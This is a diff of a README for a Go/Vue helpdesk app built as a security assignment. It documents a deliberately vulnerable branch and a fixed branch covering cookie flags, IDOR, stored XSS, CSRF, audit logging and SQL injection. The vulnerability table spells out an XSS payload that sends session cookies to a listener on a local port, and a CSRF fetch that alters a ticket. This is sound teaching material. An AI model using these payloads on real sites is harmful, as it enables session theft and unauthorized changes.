@@ -48,11 +48,12 @@ helpdesk/
 │   │   ├── models/          # GORM models
 │   │   ├── repositories/     # Database access layer
 │   │   ├── services/        # Business logic
-│   │   ├── routes/          # Route registration
-│   │   └── requests/        # Request binding / validation structs
-│   ├── migrations/          # SQL migrations (Goose)
-│   ├── seed/                # Optional seed data (incl. CA fixtures when `SEED_CA` is set)
-│   ├── makefile             # `goose` DB tasks, `serve`, `check`
+│   │   ├── routes/          # Route registration and management
+│   │   └── requests/        # Request and validation structs
+|   |   ├── response/        # Response management
+│   ├── migrations/          # SQL migrations (using Goose)
+│   ├── seed/                # Optional seed data for immediate testing
+│   ├── makefile             # Makefile for easy command execution
 │   └── go.mod
 ├── frontend/                # Vue 3 + Vite + TypeScript + Tailwind
 │   ├── src/
@@ -65,7 +66,7 @@ helpdesk/
 │   ├── vite.config.ts
 │   └── package.json
 ├── sast/                    # Saved SAST / dependency scan JSON (CA appendix)
-└── README.md                # This file
+└── README.md                # Setup Instruction and general app info
 ```
 
 **Important files**
@@ -166,18 +167,31 @@ Open the URL printed by Vite (typically `http://localhost:3000`). Ensure `FRONTE
 
 ## Security improvements (vulnerabilities addressed)
 
-The project follows a structured remediation plan aligned with the course **VULN-01 … VULN-06** themes. Summary:
+The project follows a structured vulnerability and remediation plan **VULN-01 … VULN-06** labels on the vuln-baseline branch, with matching improvement IDs **SEC-01 … SEC-06** on the secure branch.
 
-| ID | Topic | Risk | Remediation summary |
-|----|-------|------|---------------------|
-| **VULN-01** | Session cookie flags | Tokens readable by JS or sent over HTTP | Set **`HttpOnly=true`**, **`Secure=true`** in production (HTTPS), consistent **`SameSite`**, and mirror flags in **`clearAuthCookies`** |
-| **VULN-02** | IDOR | Access other users’ profiles or tickets by ID | Prefer **`GET/PATCH /api/users/me`** only; enforce **ticket access policy** (reporter / assignee / admin) on every ticket route |
-| **VULN-03** | Stored XSS | User content executed as HTML | **`TrimSpace`** on text fields; render ticket/comment bodies as **plain text** (no `v-html` on user-controlled fields) |
-| **VULN-04** | CSRF | Cross-site form posts mutate state | **`CSRFRequired`**: compare **`X-CSRF-Token`** to session token with **constant-time** equality before `c.Next()` |
-| **VULN-05** | Weak audit trail | No forensic trail for incidents | **`audit_logs`** (append-only), actor from **session only**, optional metadata; no secrets in log payloads |
-| **VULN-06** | SQL injection (search) | Search query concatenated into raw SQL | **Parameterized** `LIKE` (or GORM `Where` with `?` placeholders); escape `%` / `_` for `LIKE` if needed |
+### Vulnerabilities
 
-Code locations are tagged with `// VULN-…` comments until fully remediated; replace tags with `// SEC-…` or remove after review. Internal design notes may live in your assignment `ca2/vuln-mitigation.md` (if copied into the repo or kept alongside the project).
+| ID | Topic | Risk | Vulnerability summary |
+|----|-------|------|-------------------------|
+| **VULN-01** | Session cookie flags | Tokens readable by JS or sent over HTTP | Session cookies **`HttpOnly=false`**, **`Secure=false`**, exposing tokens to script access, insecure transport. |
+| **VULN-02** | IDOR | Access other users’ profiles or tickets by ID | Clients may reference guessable resource IDs; the API does not enforce **ownership or role** before returning or mutating another user’s profile or ticket. |
+| **VULN-03** | Stored XSS | User content executed as HTML | Ticket or comment text is rendered as **HTML** in the UI (**v-html**) or passed unsafely into templates, allowing **stored script** execution in victims’ browsers e.g `<img src=x onerror="new Image().src='http://127.0.0.1:4444/?c='+encodeURIComponent(document.cookie)">` |
+| **VULN-04** | CSRF | Cross-site form posts mutate state | State-changing requests accept **session cookies** without a **bound anti-CSRF token** to the session, allowing malicious sites to trigger actions with invalid csrf tokens. e.g `<img src=x onerror='fetch("http://127.0.0.1:5000/api/tickets/4",{method:"PATCH",credentials:"include",headers:{"Content-Type":"application/json","X-CSRF-Token":"invalid-xxx"},body:JSON.stringify({description:"You have been pwned."})})'` |
+| **VULN-05** | Weak audit trail | No forensic trail for incidents | Sensitive actions may leave **no footprint** of actor, action, and outcome, hindering detection, incident review and non-repudiation. |
+| **VULN-06** | SQL injection (search) | Search query concatenated into raw SQL | User search input may be **concatenated into SQL strings**, allowing **injection** and unintended data access or modification. |
+
+### Improvements
+
+| ID | Topic | Improvement summary |
+|----|-------|---------------------|
+| **SEC-01** | Session cookie flags | Set **`HttpOnly=true`**, **`Secure=true`** in production (HTTPS) while local `Secure=false`, consistent **`SameSite=strict`**; same flags when clearing cookies. |
+| **SEC-02** | IDOR | Prefer **`GET/PATCH /api/users/me`** only; enforce **ticket access policy** so only owner or admin can access tickets; use **UUID** identifiers where appropriate. |
+| **SEC-03** | Stored XSS | **`TrimSpace`** on text fields at the backend; render ticket/comment bodies as **plain text** in the frontend (**no `v-html`** on user-controlled fields). |
+| **SEC-04** | CSRF | **`CSRFRequired`** middleware: compare **`X-CSRF-Token`** to the session token with **constant-time** equality before `c.Next()`. |
+| **SEC-05** | Weak audit trail | **`audit_logs`** in append-only mode, actor from **session only**, optional metadata; **no secrets** in log payloads. |
+| **SEC-06** | SQL injection (search) | **Parameterized** search queries (GORM placeholders); no raw concatenation of user input into SQL. |
+
+Code locations are tagged with `// VULN-…` (e.g. **`// VULN-01`**) on the vulnerability branch (**`vulnerable-baseline`**), then replaced with **`// SEC-…`** (e.g. **`// SEC-01`**) on **`secure-fix`**.
 
 ---
 
@@ -248,6 +262,7 @@ npm run lint -- --fix
 | Migrations | [Goose](https://github.com/pressly/goose) |
 | Frontend | [Vue.js](https://vuejs.org/), [Vite](https://vitejs.dev/), [Vue Router](https://router.vuejs.org/) |
 | Password hashing | [golang.org/x/crypto](https://pkg.go.dev/golang.org/x/crypto) (Argon2) |
+|Argon2d Implementation|[How to Hash and Verify Passwords with Argon2 in Go](https://www.alexedwards.net/blog/how-to-hash-and-verify-passwords-with-argon2-in-go)
 | Tokens | [PASETO](https://github.com/o1egl/paseto) |
 |MySQL Databae|
 
